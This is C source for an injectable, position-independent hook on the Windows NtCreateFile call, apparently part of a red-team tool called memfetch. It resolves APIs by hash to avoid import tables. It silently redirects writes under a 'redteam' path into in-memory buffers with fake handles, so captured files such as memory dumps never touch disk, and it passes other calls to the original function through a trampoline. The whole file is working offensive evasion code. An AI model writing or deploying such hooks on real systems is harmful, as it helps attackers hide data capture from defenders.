#include <Core.h>
#include <Win32.h>

SEC( text, B ) NTSTATUS Entry( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength ) 
{
    INSTANCE Instance = { };

    Instance.Modules.Kernel32   = LdrModulePeb( HASH_KERNEL32 ); 
    Instance.Modules.Ntdll      = LdrModulePeb( HASH_NTDLL ); 
    
    if ( Instance.Modules.Kernel32 != NULL )
    {
        // Load needed functions
        Instance.Win32.LoadLibraryA = LdrFunction( Instance.Modules.Kernel32, 0xb7072fdb );
        
        // Load needed Libraries
        Instance.Modules.MSVCRT     = Instance.Win32.LoadLibraryA( GET_SYMBOL( "msvcrt" ) );
        
        //Populate MSVCRT functions
        if ( Instance.Modules.MSVCRT != NULL ) 
        {
            Instance.Win32.wcsstr = LdrFunction( Instance.Modules.MSVCRT, 0xd7bb2ceb );
            Instance.Win32.wcslen = LdrFunction( Instance.Modules.MSVCRT, 0xd7bb0d31 );
            Instance.Win32.wcscmp = LdrFunction( Instance.Modules.MSVCRT, 0xd7bae7f2 );
            Instance.Win32.malloc = LdrFunction( Instance.Modules.MSVCRT, 0xc03f707d );
            Instance.Win32.memset = LdrFunction( Instance.Modules.MSVCRT, 0xc0887b70 );
            Instance.Win32.memcpy = LdrFunction( Instance.Modules.MSVCRT, 0xc08838d0 );
            Instance.Win32.free = LdrFunction( Instance.Modules.MSVCRT, 0x7c84d807 );
            Instance.Win32.sprintf_s = LdrFunction( Instance.Modules.MSVCRT, 0xe32a7d7d );
        } 

    }

	//Placeholder string gets patched in with address of pFileInfo struct before it is injected
	char* pFileInfoStr = GET_SYMBOL( "AAAAAAAAAAAAAAAA" );

	//This routine to transform pFileInfoStr to a ull so we can create our struct: https://stackoverflow.com/a/39052987/18776214
	//Using things like stoull or strtoi64 altered the PIC EXE, forcing the trampoline function call at the end to use a CALL instruction rather than a JMP. 
	//This messed all kinds of things up, so using this snippet to achieve the same result without an API.
	unsigned long long val = 0;
	while (*pFileInfoStr) {
		// get current character then increment
		uint8_t byte = *pFileInfoStr++;
		// transform hex character to the 4bit equivalent number, using the ascii table indexes
		if (byte >= '0' && byte <= '9') byte = byte - '0';
		else if (byte >= 'a' && byte <= 'f') byte = byte - 'a' + 10;
		else if (byte >= 'A' && byte <= 'F') byte = byte - 'A' + 10;
		// shift 4 to make space for new digit, and add the 4 bits of the new digit 
		val = (val << 4) | (byte & 0xF);
	}

	//Create struct
	struct FileInfo* pFileInfo = (struct FileInfo*)val;

	//Define our special directory!
    wchar_t* hookdir =  GET_SYMBOL( L"redteam" );

	//First things first, we need to determine if we want to capture the file/data associated with the NtCreateFile call. To do so, check the filepath looking for our hookdir value.
	wchar_t* pHookDir = Instance.Win32.wcsstr(ObjectAttributes->ObjectName->Buffer, hookdir);

	//If pHookDir isn't null, we found our hookdir and we want to manipulate this call to NtCreateFile
	if (pHookDir != NULL)
	{
		//We need to determine if this is call is to create a new file or not.
		//Parse out filename from after our hookdir
		wchar_t* filename = pHookDir + Instance.Win32.wcslen(hookdir) + 1;
		BOOL matchfound = FALSE;

		//If numFiles is greater than 0, we need to look in FileInfo struct for our file
		if (pFileInfo->numFiles > 0)
		{
			//Iterate through our FileInfo->filename array and see if the file exists already
			for (int i = 0; i < pFileInfo->numFiles; i++)
			{
				//If we find a match
				if (Instance.Win32.wcscmp(pFileInfo->filename[i], filename) == 0)
				{
					//Set FileHandle == the corresponding handle in FileInfo
					*FileHandle = pFileInfo->filehandle[i];

					matchfound = TRUE;
					break;
				}
			}
		}

		//If we didn't find a match or if this is the first file in FileInfo, we need to create a new entry for this file
		if (!matchfound)
		{
			//We need to find an empty slot in our file array to hold our file info
			//We do it this way in case there is a file that wasn't properly closed when memfetch is ran. 
			//The file array would still have a file at an unknown index, so we can't assume what is and isn't there.
			int j;
			for (j = 0; j < 100; j++)
			{
				if(pFileInfo->filehandle[j] == NULL)
					break;
			}

			//Allocate mem and copy name into struct
			pFileInfo->filename[j] = Instance.Win32.malloc(((Instance.Win32.wcslen(filename) + 1) * 2));
			Instance.Win32.memset(pFileInfo->filename[j], 0, ((Instance.Win32.wcslen(filename) + 1) * 2));
			Instance.Win32.memcpy(pFileInfo->filename[j], filename, ((Instance.Win32.wcslen(filename) + 1) * 2));

			//Create a unique "handle" to return + set function arg FileHandle to this value
			pFileInfo->filehandle[j] = (HANDLE)(0x10000000 + pFileInfo->totalFiles);
			*FileHandle = pFileInfo->filehandle[j];

			//Allocate mem for file data. Use 1mb initially, can be modified later during NtWriteFile as needed
			pFileInfo->filedata[j] = Instance.Win32.malloc(1048576 * sizeof(char));
			Instance.Win32.memset(pFileInfo->filedata[j], 0, 1048576 * sizeof(char));

			//Set allocation length and data length
			pFileInfo->fileallocationlen[j] = 1048576;
			pFileInfo->filedatalen[j] = 0;

			//Set fileclosed value to FALSE so we can track that there are expected further writes to this "file"
			pFileInfo->fileclosed[j] = FALSE;

			//Finally we increment numFiles to track that we have added an entry and also increment totalFiles to track our unique handles
			pFileInfo->numFiles++;
			pFileInfo->totalFiles++;
		}

		//Always do these regardless of if it is a new file or an existing one
		IoStatusBlock->Status = FILE_CREATED;

		return STATUS_SUCCESS;
	}

	//If our hookdir wasn't found in the path, this is a normal call to NtCreateFile and we patch it back to the original NtCreateFile with the trampoline.
	else
	{
		_NtCreateFile f = (_NtCreateFile)pFileInfo->NtCreateFiletrampoline;
		return f(FileHandle, DesiredAccess, ObjectAttributes, IoStatusBlock, AllocationSize, FileAttributes, ShareAccess, CreateDisposition, CreateOptions, EaBuffer, EaLength);
	}
}